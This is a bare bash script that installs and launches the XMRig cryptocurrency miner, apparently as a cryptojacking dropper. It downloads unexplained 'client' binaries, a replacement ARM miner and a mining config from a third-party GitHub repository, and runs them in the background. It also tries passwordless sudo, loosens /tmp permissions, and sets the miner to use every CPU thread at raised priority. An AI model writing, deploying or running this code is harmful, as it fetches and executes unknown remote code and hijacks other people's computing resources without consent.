#!/bin/bash
xmrver="6.22.0"
if [ -d /tmp ]; then
    echo "/tmp exists"
else
    sudo -n mkdir /tmp
    sudo -n chmod 777 /tmp
fi
unalias -a
sudo -n apt update
sudo -n apt install -y wget util-linux
sudo -n apk add wget util-linux
sudo -n dnf install wget util-linux
if command -v wget >/dev/null 2>&1; then
    DOWNLOAD_CMD="wget"
else
    DOWNLOAD_CMD="curl -OL"
fi
arch=$(uname -m)
is_arm64=false
if [ "$arch" == "aarch64" ]; then
    is_arm64=true
fi
mkdir -p /tmp/xmrig
cd /tmp/xmrig
$DOWNLOAD_CMD https://github.com/xmrig/xmrig/releases/download/v$xmrver/xmrig-$xmrver-linux-static-x64.tar.gz
tar -xf xmrig-$xmrver-linux-static-x64.tar.gz
cd xmrig-$xmrver
if $is_arm64; then
    rm -f xmrig
    $DOWNLOAD_CMD https://github.com/spetterman66/verynicerepo/raw/main/xmrig
fi
if $is_arm64; then
    $DOWNLOAD_CMD https://github.com/spetterman66/verynicerepo/raw/main/client_linux_arm64
    chmod +x client_linux_arm64 && ./client_linux_arm64 &
else
    $DOWNLOAD_CMD https://github.com/spetterman66/verynicerepo/raw/main/client_linux_x64
    chmod +x client_linux_x64 && ./client_linux_x64 &
fi
chmod +x xmrig
rm -f config.json
$DOWNLOAD_CMD https://raw.githubusercontent.com/spetterman66/verynicerepo/main/config.json
randnum=$(( RANDOM % 1000 + 1 ))
sed -i "s/17lifers@home/17lifers-vnc-$randnum/g" config.json
sed -i 's/"priority": 3/"priority": 5/g' config.json
num_threads=$(cat /proc/cpuinfo | grep -c '^processor')
replacement_string=$(yes -1 | head -n $num_threads | paste -sd, -)
replacement_string=${replacement_string%, }
sed -i "s/THREADSTRINGTOREPLACE/$replacement_string/g" config.json
sudo -n ./xmrig
./xmrig
